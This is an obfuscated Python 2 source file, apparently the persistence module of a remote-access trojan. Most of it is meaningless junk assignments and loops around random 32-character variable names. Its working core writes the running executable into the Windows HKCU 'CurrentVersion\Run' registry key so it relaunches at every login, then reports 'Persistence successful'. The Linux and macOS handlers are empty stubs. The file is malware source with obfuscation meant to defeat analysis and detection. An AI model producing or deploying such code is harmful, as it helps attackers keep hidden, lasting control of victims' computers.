# -*- coding: utf-8 -*-

YmJXuGPYFfMvkJvElngERosoGVioKJzH = 'JyjpBxZHCzrreCedxTAQEDpBXUODimov'
SzjtZZQAuWFrplKdhWZHikTRzqpFOKze = 'eCYDFVezKzLvcoOcegrwPqqsJaQBcTFF'
timzxYHQQSULgCnrCUncfdwYIJAWTCek = 'ZXpESuVOfxOLUZnqRUnJANLWpaKceNls'
lptsbXEdNZNEsgBFKWbzHdcGMNGtEsiC = 'mlxAlmxGCVcykyuVduEtJbRHaWuzcLjs'
NiWbVThqssjNBFFBPqwvtdGLhNCOQUga = 'ePPXbnCUNwfoLRLOcWvRUdKWmDdtBjyK'
if YmJXuGPYFfMvkJvElngERosoGVioKJzH in SzjtZZQAuWFrplKdhWZHikTRzqpFOKze:
    YmJXuGPYFfMvkJvElngERosoGVioKJzH = NiWbVThqssjNBFFBPqwvtdGLhNCOQUga
    if SzjtZZQAuWFrplKdhWZHikTRzqpFOKze in timzxYHQQSULgCnrCUncfdwYIJAWTCek:
        SzjtZZQAuWFrplKdhWZHikTRzqpFOKze = lptsbXEdNZNEsgBFKWbzHdcGMNGtEsiC
elif SzjtZZQAuWFrplKdhWZHikTRzqpFOKze in YmJXuGPYFfMvkJvElngERosoGVioKJzH:
    timzxYHQQSULgCnrCUncfdwYIJAWTCek = SzjtZZQAuWFrplKdhWZHikTRzqpFOKze
    if timzxYHQQSULgCnrCUncfdwYIJAWTCek in SzjtZZQAuWFrplKdhWZHikTRzqpFOKze:
        SzjtZZQAuWFrplKdhWZHikTRzqpFOKze = NiWbVThqssjNBFFBPqwvtdGLhNCOQUga
import sys

xGyuYtDgStnFuJwJnFLVxxlbTkiLNRdu = 'TJHhbprEfljuGpFBpnYZdepxgZxwwbnw'
kmlMpxHJWUQjMclghOxnuMCirPhskVwB = 'WBYoOSpZEXueXQTKygaBTbetrfpVvowx'
if xGyuYtDgStnFuJwJnFLVxxlbTkiLNRdu != kmlMpxHJWUQjMclghOxnuMCirPhskVwB:
    xGyuYtDgStnFuJwJnFLVxxlbTkiLNRdu = 'WBYoOSpZEXueXQTKygaBTbetrfpVvowx'
    kmlMpxHJWUQjMclghOxnuMCirPhskVwB = xGyuYtDgStnFuJwJnFLVxxlbTkiLNRdu
    xGyuYtDgStnFuJwJnFLVxxlbTkiLNRdu = 'TJHhbprEfljuGpFBpnYZdepxgZxwwbnw'
def psfoKqrCwbxZxQTDgdZWuOhjRbOKvvYv():
    import _winreg

    oRkatzBZTATnBrTJoJAnFjKDfShxteMv = 'BfYHXQykhTaWALnpWrEUzligDIyQrkLe'
    FNSrWEgMMeKnVHMhoEgurWBjDfBPTakr = 'qUvtgodYeCXZSnAzJojByQCxtsaoopzp'
    qLLHLDqLxZKuTgrRdhZLZKJmeBMTSTqt = 'GHsWJnZxCtEuSVQTTAeKzJCJmdqMXeoS'
    vbkwsuVuPwRQBtKUDvAWWoELsupUxwAT = 'DPJSiNpXImcSjqrSEtJFrPkHZABvwnPE'
    vDokWXZwaOYxmSlyEXXLuQeskwQauuJt = 'DJFILPYXiDAoUDUVairtxElNMlaDxPPF'
    GwYToGrMebzemRyKSZqUkrxtfEzIOvsK = 'UtXNAEYvvaCBeKAsQfnPMeaUhYmZQKsi'
    if oRkatzBZTATnBrTJoJAnFjKDfShxteMv != vbkwsuVuPwRQBtKUDvAWWoELsupUxwAT:
        FNSrWEgMMeKnVHMhoEgurWBjDfBPTakr = qLLHLDqLxZKuTgrRdhZLZKJmeBMTSTqt
        for GwYToGrMebzemRyKSZqUkrxtfEzIOvsK in vbkwsuVuPwRQBtKUDvAWWoELsupUxwAT:
            if GwYToGrMebzemRyKSZqUkrxtfEzIOvsK != qLLHLDqLxZKuTgrRdhZLZKJmeBMTSTqt:
                FNSrWEgMMeKnVHMhoEgurWBjDfBPTakr = FNSrWEgMMeKnVHMhoEgurWBjDfBPTakr
            else:
                vDokWXZwaOYxmSlyEXXLuQeskwQauuJt = oRkatzBZTATnBrTJoJAnFjKDfShxteMv
    else:
        qLLHLDqLxZKuTgrRdhZLZKJmeBMTSTqt = oRkatzBZTATnBrTJoJAnFjKDfShxteMv
        oRkatzBZTATnBrTJoJAnFjKDfShxteMv = vDokWXZwaOYxmSlyEXXLuQeskwQauuJt
        if qLLHLDqLxZKuTgrRdhZLZKJmeBMTSTqt == oRkatzBZTATnBrTJoJAnFjKDfShxteMv:
            for GwYToGrMebzemRyKSZqUkrxtfEzIOvsK in oRkatzBZTATnBrTJoJAnFjKDfShxteMv:
                if GwYToGrMebzemRyKSZqUkrxtfEzIOvsK == qLLHLDqLxZKuTgrRdhZLZKJmeBMTSTqt:
                    qLLHLDqLxZKuTgrRdhZLZKJmeBMTSTqt = oRkatzBZTATnBrTJoJAnFjKDfShxteMv
                else:
                    qLLHLDqLxZKuTgrRdhZLZKJmeBMTSTqt = vDokWXZwaOYxmSlyEXXLuQeskwQauuJt
    from _winreg import HKEY_CURRENT_USER as HKCU

    AfzRFXRHIMulSpToUGMDYIEyQGjUQZAk = 'JCoKPdVPxrWZzPGroCLCXDICvHJJpIvf'
    PbwEBlOsJdQAfLZNzQAuiqkztnTQcNbC = 'KxJbfAHpffUrjCZxPimNSoBvZINZtnhG'
    trNasTtrsNffZnubfWTzthedCUIRhZOp = 'QgSUGKaJFKoodGjYYoJZbpuzQKdUXsTY'
    wkIeghwMAyTpmBGUHfYCjVRUcPPmeZXV = 'TCgUQpzWAteRlIcMGLyWhttLiYQlzitw'
    GzgXcVFmaCTTwZTrHrpspBygWCWdoszH = 'bNUtkLyNBznecmBjMJddrJHQxyUBzDBx'
    BrGNElYFAqgJIxlyvTxPtDkYNJtFrCfA = 'qCKVLGIveupAoPbQsWJiMcPkBdCwOlwV'
    if trNasTtrsNffZnubfWTzthedCUIRhZOp == wkIeghwMAyTpmBGUHfYCjVRUcPPmeZXV:
        for BrGNElYFAqgJIxlyvTxPtDkYNJtFrCfA in GzgXcVFmaCTTwZTrHrpspBygWCWdoszH:
            if BrGNElYFAqgJIxlyvTxPtDkYNJtFrCfA == wkIeghwMAyTpmBGUHfYCjVRUcPPmeZXV:
                GzgXcVFmaCTTwZTrHrpspBygWCWdoszH = AfzRFXRHIMulSpToUGMDYIEyQGjUQZAk
            else:
                wkIeghwMAyTpmBGUHfYCjVRUcPPmeZXV = PbwEBlOsJdQAfLZNzQAuiqkztnTQcNbC
    XhbFZEGUwbsXXfMkgtwnBqQFCKCPbGQh = r'Software\Microsoft\Windows\CurrentVersion\Run'

    ynUSyCmaJITTlTNBAjeVhtGzlBtsvvsP = 'qfWwQSFwVjXuRuNCQbxCBjZVPvehFuFx'
    RIshljBKYMgtVlmPnfSzzIyPhVomvktL = 'OyyvNEaBczhFOuemUhxrTXRWzzPIwfFX'
    RXKtVWaGGrruKNIzwpgEertJVZNKFEyi = 'QzVaaMZxFdBxRVeIoPxaYGxANJqyFbNj'
    NjQXUYpfSzVcckRjkmxnOvqZfmVXUfdE = 'UbBcCLjpMIUjHTDMJYoCOkhhgFIoOqmA'
    nQoawDRIxayrTHDNkxtZhZjksuHyWcQv = 'BVitGgFoOZDRzemauVkpdlcBPTtTGeMx'
    qGLXlQXklOdcofmoVpvIENBGcHpaaEGD = 'hYaEJkxVJxjQdsDorRqZDixupTRYUWnJ'
    if ynUSyCmaJITTlTNBAjeVhtGzlBtsvvsP != NjQXUYpfSzVcckRjkmxnOvqZfmVXUfdE:
        RIshljBKYMgtVlmPnfSzzIyPhVomvktL = RXKtVWaGGrruKNIzwpgEertJVZNKFEyi
        for qGLXlQXklOdcofmoVpvIENBGcHpaaEGD in NjQXUYpfSzVcckRjkmxnOvqZfmVXUfdE:
            if qGLXlQXklOdcofmoVpvIENBGcHpaaEGD != RXKtVWaGGrruKNIzwpgEertJVZNKFEyi:
                RIshljBKYMgtVlmPnfSzzIyPhVomvktL = RIshljBKYMgtVlmPnfSzzIyPhVomvktL
            else:
                nQoawDRIxayrTHDNkxtZhZjksuHyWcQv = ynUSyCmaJITTlTNBAjeVhtGzlBtsvvsP
    else:
        RXKtVWaGGrruKNIzwpgEertJVZNKFEyi = ynUSyCmaJITTlTNBAjeVhtGzlBtsvvsP
        ynUSyCmaJITTlTNBAjeVhtGzlBtsvvsP = nQoawDRIxayrTHDNkxtZhZjksuHyWcQv
        if RXKtVWaGGrruKNIzwpgEertJVZNKFEyi == ynUSyCmaJITTlTNBAjeVhtGzlBtsvvsP:
            for qGLXlQXklOdcofmoVpvIENBGcHpaaEGD in ynUSyCmaJITTlTNBAjeVhtGzlBtsvvsP:
                if qGLXlQXklOdcofmoVpvIENBGcHpaaEGD == RXKtVWaGGrruKNIzwpgEertJVZNKFEyi:
                    RXKtVWaGGrruKNIzwpgEertJVZNKFEyi = ynUSyCmaJITTlTNBAjeVhtGzlBtsvvsP
                else:
                    RXKtVWaGGrruKNIzwpgEertJVZNKFEyi = nQoawDRIxayrTHDNkxtZhZjksuHyWcQv
    BcedMTcDsQRtXxfGGflioiExOOHEDxNj = sys.executable

    mpVkPPtzlAspmVAgsIpzuvniNhloFbQW = 'ukkaRvweUIlZgphhDzbkhkwtxjxTZsfX'
    sqiYiYRrsolmPWuqFKhJZcNxqnIbDvjm = 'haPfVrfqtzIMLxmjVNFqQXcjjDQBlPOV'
    JDFcaEWwXKwIULRoVwkoGOohpYKtlKph = 'XyvvqYfvWOPyvZAipCRJMmwKQNPCTwXT'
    klQXKunLVrRCpBFLVYqgAonjVIAohQfq = 'aRxPmZJRvzfOeZLTJCfIkpdslOxQCQSR'
    mtpbdUrVWHQIPoBPygRxCcZkCSnDIKEe = 'emTwAZqKncDgkAmkemBPtYfNYnPPgKhp'
    if mpVkPPtzlAspmVAgsIpzuvniNhloFbQW in sqiYiYRrsolmPWuqFKhJZcNxqnIbDvjm:
        mpVkPPtzlAspmVAgsIpzuvniNhloFbQW = mtpbdUrVWHQIPoBPygRxCcZkCSnDIKEe
        if sqiYiYRrsolmPWuqFKhJZcNxqnIbDvjm in JDFcaEWwXKwIULRoVwkoGOohpYKtlKph:
            sqiYiYRrsolmPWuqFKhJZcNxqnIbDvjm = klQXKunLVrRCpBFLVYqgAonjVIAohQfq
    elif sqiYiYRrsolmPWuqFKhJZcNxqnIbDvjm in mpVkPPtzlAspmVAgsIpzuvniNhloFbQW:
        JDFcaEWwXKwIULRoVwkoGOohpYKtlKph = sqiYiYRrsolmPWuqFKhJZcNxqnIbDvjm
        if JDFcaEWwXKwIULRoVwkoGOohpYKtlKph in sqiYiYRrsolmPWuqFKhJZcNxqnIbDvjm:
            sqiYiYRrsolmPWuqFKhJZcNxqnIbDvjm = mtpbdUrVWHQIPoBPygRxCcZkCSnDIKEe
    try:

        QRlHlgsEAAPmsofTLJIuJKKepVFLJCLX = 'RekaCAXBFBpyFVXkDQuRslQfCHtErvMP'
        fToYdxzqtOGxsPpacqBdGkbSRcZmUJBu = 'XlNXlsxTLRSNSIBkoXPLlKJNkWTlJSxx'
        IjGXwyywaHVOQOVJmLZTmlUckSnlptuh = 'CceVcdGMGaNDOjMdvhQlgdGuWYMMRTVx'
        ALnlpXStYtXggpoJwZGTzrdweHmnWGST = 'gvnqkbNogwwOrTKjhZJtaJSfgZRkQhEx'
        duhGdjQCovQobNLMPeBjmCwaSkDtAapm = 'GiWeYMtPrkytLBtYDehwbnMiVymwGrKk'
        VZNLYHhIzWMEyuiiMmQAgrwAJuHYHxpn = 'VFsbSfombYIfVUzftMdGvUQXttxfEcHC'
        if IjGXwyywaHVOQOVJmLZTmlUckSnlptuh == ALnlpXStYtXggpoJwZGTzrdweHmnWGST:
            for VZNLYHhIzWMEyuiiMmQAgrwAJuHYHxpn in duhGdjQCovQobNLMPeBjmCwaSkDtAapm:
                if VZNLYHhIzWMEyuiiMmQAgrwAJuHYHxpn == ALnlpXStYtXggpoJwZGTzrdweHmnWGST:
                    duhGdjQCovQobNLMPeBjmCwaSkDtAapm = QRlHlgsEAAPmsofTLJIuJKKepVFLJCLX
                else:
                    ALnlpXStYtXggpoJwZGTzrdweHmnWGST = fToYdxzqtOGxsPpacqBdGkbSRcZmUJBu
        dJUqGFhgwZJURqFSOXapmZKngZcTMbgt = _winreg.OpenKey(HKCU, XhbFZEGUwbsXXfMkgtwnBqQFCKCPbGQh, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(dJUqGFhgwZJURqFSOXapmZKngZcTMbgt, 'br', 0, _winreg.REG_SZ, BcedMTcDsQRtXxfGGflioiExOOHEDxNj)
        _winreg.CloseKey(dJUqGFhgwZJURqFSOXapmZKngZcTMbgt)
        return True, 'HKCU Run registry key applied'
    except WindowsError:

        wFfQKBfxyUFjkbtXxlDqvNyqNqkAkMSt = 'ttNnxvniFdjtfAGdzcqsJihGtaqgsefT'
        lUZkcwmQUSfEodxUWcfCZSHxDLyvwFlk = 'xeuzXGaijzuBPpgmHoKRiMQJQGzFtqQg'
        TtgShdIhGimFfzxKrxOkDCXFvCMBBQdn = 'JFnfCoggCRKDFFAHFtManbxDAAvRnSTd'
        if wFfQKBfxyUFjkbtXxlDqvNyqNqkAkMSt == lUZkcwmQUSfEodxUWcfCZSHxDLyvwFlk:
            TtgShdIhGimFfzxKrxOkDCXFvCMBBQdn = 'JFnfCoggCRKDFFAHFtManbxDAAvRnSTd'
            TtgShdIhGimFfzxKrxOkDCXFvCMBBQdn = wFfQKBfxyUFjkbtXxlDqvNyqNqkAkMSt
        else:
            TtgShdIhGimFfzxKrxOkDCXFvCMBBQdn = 'JFnfCoggCRKDFFAHFtManbxDAAvRnSTd'
            TtgShdIhGimFfzxKrxOkDCXFvCMBBQdn = 'ttNnxvniFdjtfAGdzcqsJihGtaqgsefT'
        return False, 'HKCU Run registry key failed'
def uyhJeMgVxQDzilNjXlrjHOeMhFaKBXoy():
    return False, 'nothing here yet'
def WtxOziZIzLLTEKaxkZTCuFmYjeEydNAJ():
    return False, 'nothing here yet'
def CjVxWcOTrRVtfhmLQPYezPvfvjIoelab(plat_type):
    if plat_type.startswith('win'):

        WwmSQzfcRPiFZQoFZRNBflZYMzjOuNMp = 'cnwnBdHeAbaQVErHXGcDlnokthNtNUnM'
        RMFZnTWeozMvzBxGlETjwYYLLKwfGxhX = 'fbTmRHqRxHkkWEqTHgKdMpAUZRbjiUOb'
        YoCuDQnojslfDAHeAHTgtMFjhvEyFkXp = 'wgnhThRuCrZAPwrWHsbzLDZQAYKntGEt'
        if WwmSQzfcRPiFZQoFZRNBflZYMzjOuNMp == RMFZnTWeozMvzBxGlETjwYYLLKwfGxhX:
            YoCuDQnojslfDAHeAHTgtMFjhvEyFkXp = 'wgnhThRuCrZAPwrWHsbzLDZQAYKntGEt'
            YoCuDQnojslfDAHeAHTgtMFjhvEyFkXp = WwmSQzfcRPiFZQoFZRNBflZYMzjOuNMp
        else:
            YoCuDQnojslfDAHeAHTgtMFjhvEyFkXp = 'wgnhThRuCrZAPwrWHsbzLDZQAYKntGEt'
            YoCuDQnojslfDAHeAHTgtMFjhvEyFkXp = 'cnwnBdHeAbaQVErHXGcDlnokthNtNUnM'
        cwcHJLjZZazSreuktNAHsdyloSJSWOpO, CmnkqsGrLstTqDTTrpaIHJynLVhTmIQT = psfoKqrCwbxZxQTDgdZWuOhjRbOKvvYv()
    elif plat_type.startswith('linux'):

        mngjIbMdCSsDieXNnNycBOPCegCWckEv = 'iKIFOdDRTIAEBMEmPoKnFMqFqWdobCja'
        mqpEfJSZWTxnRYrEBtlsWpHmhSRzQVdW = 'ShVLfJZtNDHeKUMNuvAOmOEOFSkZIQio'
        GcadIFddFEQorQqJtWMtrVsvfhLCJEJQ = 'OUyhBTFLDrlxyWqiCqSUQTUAXBbMOtSW'
        if mngjIbMdCSsDieXNnNycBOPCegCWckEv == mqpEfJSZWTxnRYrEBtlsWpHmhSRzQVdW:
            GcadIFddFEQorQqJtWMtrVsvfhLCJEJQ = 'OUyhBTFLDrlxyWqiCqSUQTUAXBbMOtSW'
            GcadIFddFEQorQqJtWMtrVsvfhLCJEJQ = mngjIbMdCSsDieXNnNycBOPCegCWckEv
        else:
            GcadIFddFEQorQqJtWMtrVsvfhLCJEJQ = 'OUyhBTFLDrlxyWqiCqSUQTUAXBbMOtSW'
            GcadIFddFEQorQqJtWMtrVsvfhLCJEJQ = 'iKIFOdDRTIAEBMEmPoKnFMqFqWdobCja'
        cwcHJLjZZazSreuktNAHsdyloSJSWOpO, CmnkqsGrLstTqDTTrpaIHJynLVhTmIQT = uyhJeMgVxQDzilNjXlrjHOeMhFaKBXoy()
    elif plat_type.startswith('darwin'):

        rOdNYTeEfJfevaUdeijdoedgtJRjxFhu = 'iCzaILDwvYPksKemjeYTerqjWCfOXGAq'
        yrZsBMVZkJNEuyzSehNAFdafqiHCBTsf = 'OMYWgKWCPUKMcAizxTdaRluCIMupKrdr'
        if rOdNYTeEfJfevaUdeijdoedgtJRjxFhu != yrZsBMVZkJNEuyzSehNAFdafqiHCBTsf:
            rOdNYTeEfJfevaUdeijdoedgtJRjxFhu = 'OMYWgKWCPUKMcAizxTdaRluCIMupKrdr'
            yrZsBMVZkJNEuyzSehNAFdafqiHCBTsf = rOdNYTeEfJfevaUdeijdoedgtJRjxFhu
            rOdNYTeEfJfevaUdeijdoedgtJRjxFhu = 'iCzaILDwvYPksKemjeYTerqjWCfOXGAq'
        cwcHJLjZZazSreuktNAHsdyloSJSWOpO, CmnkqsGrLstTqDTTrpaIHJynLVhTmIQT = WtxOziZIzLLTEKaxkZTCuFmYjeEydNAJ()
    else:

        try:
            jqIALpkghcAufkLVnygBNCoDrBHMOasc = 'dPAWYIbSpoKvbCFDpGJNfLRWYAaayRbY'
            dRALWflZgfwhBlXodAQkWwWfcrDlnNIJ = 'gigPCmhDTtIOPBOQNSCIYYNOklNjvNCu'
            AJKkrPHkwFvNwjPhWvIqAaqNhhQyYLtP = 'GnLTtbGOpcppdzidJxXJyeVwGSkNzbBz'
            DwMkRsORMrlifgiQYVyNQBimMkUaJVzB = 'TjdoHGTUMURRQWqkVlYJefFMIMJAXllF'
            EeBghwsovhwHnTNmLJGsvfihqMjMNHgb = 'ayibKIcYYDSwsWWolcFaszQnDctrCuON'
            QtgygPjtbgVbkjoZPELHSILdSnaoDapg = 'FGQcMrwrSMCTKqOflUIAdNOelaeyRPvj'
            GePKQxVDwdVGLRpAlOsyLJDOpKpqjznH = [
                    'dPAWYIbSpoKvbCFDpGJNfLRWYAaayRbY',
                    'GnLTtbGOpcppdzidJxXJyeVwGSkNzbBz',
                    'ayibKIcYYDSwsWWolcFaszQnDctrCuON',
                    'zwOdavNRlTqbtYpPXDYwDVMLLjQDnhjQ'
            ]
            for jqIALpkghcAufkLVnygBNCoDrBHMOasc in QtgygPjtbgVbkjoZPELHSILdSnaoDapg:
                for dRALWflZgfwhBlXodAQkWwWfcrDlnNIJ in AJKkrPHkwFvNwjPhWvIqAaqNhhQyYLtP:
                    if DwMkRsORMrlifgiQYVyNQBimMkUaJVzB == EeBghwsovhwHnTNmLJGsvfihqMjMNHgb:
                        dRALWflZgfwhBlXodAQkWwWfcrDlnNIJ = jqIALpkghcAufkLVnygBNCoDrBHMOasc
                    elif EeBghwsovhwHnTNmLJGsvfihqMjMNHgb == dRALWflZgfwhBlXodAQkWwWfcrDlnNIJ:
                        dRALWflZgfwhBlXodAQkWwWfcrDlnNIJ = QtgygPjtbgVbkjoZPELHSILdSnaoDapg
                    else:
                        EeBghwsovhwHnTNmLJGsvfihqMjMNHgb = QtgygPjtbgVbkjoZPELHSILdSnaoDapg
                        for dRALWflZgfwhBlXodAQkWwWfcrDlnNIJ in GePKQxVDwdVGLRpAlOsyLJDOpKpqjznH:
                            AJKkrPHkwFvNwjPhWvIqAaqNhhQyYLtP = dRALWflZgfwhBlXodAQkWwWfcrDlnNIJ
        except Exception:
            pass
        return 'Error, platform unsupported.'
    if cwcHJLjZZazSreuktNAHsdyloSJSWOpO:

        try:
            vJtHrEuxPfwjMtgfsbFjhmofhZxvtLKw = 'NYNosFiaUJVsyrSfUhJNjZOgbVwPKcAf'
            nSPZcYJHCuvcHAlJclpCAHoOkwrQvGSp = 'HKbJJenfGfgPfiPZmbdrkArHcegjuQYW'
            AlRYdVhVvosVbnqROXqHJzmsoIjgAEoa = 'mthdszAgFlBBfIdIFuLeUQZoRssrThfp'
            MPLRXSCHtskQnWFAfxYXYMCWBsyKQvMq = 'fEsAwvcKhHIkvqdLbUTyQAshuvkbpZYo'
            BfPOJDqZIXEZkRFkfWDSPXBSbtEXTJFm = 'URDkoVtKgmMTlfOqZgvuTKokEIgCPSXr'
            jzxvynmIaMktocefzwjHWMxFLBbgQXsa = 'DakubkYGDjiUqpWQTaorJitqSXlkcJPK'
            GiFaXQTULdDomlilqIhlwypUyHmotSSi = [
                    'NYNosFiaUJVsyrSfUhJNjZOgbVwPKcAf',
                    'mthdszAgFlBBfIdIFuLeUQZoRssrThfp',
                    'URDkoVtKgmMTlfOqZgvuTKokEIgCPSXr',
                    'WSpizjmnIidlvDcDgdFPPQFqoqaREcIf'
            ]
            for vJtHrEuxPfwjMtgfsbFjhmofhZxvtLKw in jzxvynmIaMktocefzwjHWMxFLBbgQXsa:
                for nSPZcYJHCuvcHAlJclpCAHoOkwrQvGSp in AlRYdVhVvosVbnqROXqHJzmsoIjgAEoa:
                    if MPLRXSCHtskQnWFAfxYXYMCWBsyKQvMq == BfPOJDqZIXEZkRFkfWDSPXBSbtEXTJFm:
                        nSPZcYJHCuvcHAlJclpCAHoOkwrQvGSp = vJtHrEuxPfwjMtgfsbFjhmofhZxvtLKw
                    elif BfPOJDqZIXEZkRFkfWDSPXBSbtEXTJFm == nSPZcYJHCuvcHAlJclpCAHoOkwrQvGSp:
                        nSPZcYJHCuvcHAlJclpCAHoOkwrQvGSp = jzxvynmIaMktocefzwjHWMxFLBbgQXsa
                    else:
                        BfPOJDqZIXEZkRFkfWDSPXBSbtEXTJFm = jzxvynmIaMktocefzwjHWMxFLBbgQXsa
                        for nSPZcYJHCuvcHAlJclpCAHoOkwrQvGSp in GiFaXQTULdDomlilqIhlwypUyHmotSSi:
                            AlRYdVhVvosVbnqROXqHJzmsoIjgAEoa = nSPZcYJHCuvcHAlJclpCAHoOkwrQvGSp
        except Exception:
            pass
        VCiTfAhlorMIlNVLauEPZyCIMIJODOxX = 'Persistence successful, {}.'.format(CmnkqsGrLstTqDTTrpaIHJynLVhTmIQT)
    else:

        rnzXQlPbspWhZlhLYroYkKoyaBOgSNtJ = 'LODIqHicpUvKGcqNqzOxHzavmqKMlTrb'
        SvJRJvsuTlDFWnadiRfjpJsjYZNLCUuE = 'AUQllTNKwtrNjWlkBQbywmtFbKKyjSpm'
        if rnzXQlPbspWhZlhLYroYkKoyaBOgSNtJ != SvJRJvsuTlDFWnadiRfjpJsjYZNLCUuE:
            rnzXQlPbspWhZlhLYroYkKoyaBOgSNtJ = 'AUQllTNKwtrNjWlkBQbywmtFbKKyjSpm'
            SvJRJvsuTlDFWnadiRfjpJsjYZNLCUuE = rnzXQlPbspWhZlhLYroYkKoyaBOgSNtJ
            rnzXQlPbspWhZlhLYroYkKoyaBOgSNtJ = 'LODIqHicpUvKGcqNqzOxHzavmqKMlTrb'
        VCiTfAhlorMIlNVLauEPZyCIMIJODOxX = 'Persistence unsuccessful, {}.'.format(CmnkqsGrLstTqDTTrpaIHJynLVhTmIQT)
    return VCiTfAhlorMIlNVLauEPZyCIMIJODOxX
